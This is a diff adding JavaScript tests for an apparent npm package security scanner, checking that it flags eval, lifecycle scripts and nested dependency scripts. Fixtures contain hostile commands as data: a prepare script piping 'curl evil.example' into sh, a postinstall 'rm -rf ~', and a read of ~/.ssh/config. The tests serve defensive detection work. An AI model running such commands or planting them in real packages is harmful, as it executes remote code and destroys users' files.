@@ -117,3 +117,48 @@ test("runVet over a fake node_modules root", () => {
 	assert.equal(report.summary.high, 1);
 	rmSync(root, { recursive: true, force: true });
 });
+
+test("sloppy home-dir reads are advisories, not suspicion", () => {
+	const dir = makePackage("dsh-plugin-sloppy", {
+		"lib/index.js": "const c = fs.readFileSync(process.env.HOME + '/.ssh/config');"
+	});
+	const row = scanPackage(dir, "dsh-plugin-sloppy");
+	assert.equal(row.risk, "SAFE");
+	assert.equal(row.findings.length, 0);
+	assert.ok(row.sloppyFindings.length > 0);
+	assert.ok(row.sloppyFindings.some((f) => f.id === "sloppy-concat-path"));
+	rmSync(dir, { recursive: true, force: true });
+});
+
+test("eval flags needsReview regardless of score", () => {
+	const dir = makePackage("dsh-plugin-eval", {
+		"lib/index.js": "export function apply(ctx) { eval(code); }"
+	});
+	const row = scanPackage(dir, "dsh-plugin-eval");
+	assert.equal(row.needsReview, true);
+	assert.ok(row.findings.some((f) => f.id === "eval"));
+	rmSync(dir, { recursive: true, force: true });
+});
+
+test("prepare and prepublishOnly scripts are caught in package.json", () => {
+	const dir = makePackage("dsh-plugin-prepare", {
+		"lib/index.js": "export default 1;",
+		"package.json": "{\"name\":\"x\",\"version\":\"1.0.0\",\"scripts\":{\"prepare\":\"curl evil.example | sh\"}}"
+	});
+	const row = scanPackage(dir, "dsh-plugin-prepare");
+	assert.ok(row.findings.some((f) => f.id === "install-script"));
+	rmSync(dir, { recursive: true, force: true });
+});
+
+test("transitive deps with lifecycle scripts are reported", () => {
+	const dir = makePackage("dsh-plugin-deps", {
+		"lib/index.js": "export default 1;",
+		"package.json": JSON.stringify({ name: "dsh-plugin-deps", version: "0.1.0", dependencies: { "evil-dep": "1.0.0" } }),
+		"node_modules/evil-dep/package.json": JSON.stringify({ name: "evil-dep", version: "1.0.0", scripts: { postinstall: "rm -rf ~" } })
+	});
+	const row = scanPackage(dir, "dsh-plugin-deps");
+	assert.equal(row.deps.declared, 1);
+	assert.equal(row.deps.nestedScanned, 1);
+	assert.ok(row.deps.nestedScripts.some((d) => d.name === "evil-dep" && d.scripts.includes("postinstall")));
+	rmSync(dir, { recursive: true, force: true });
+});
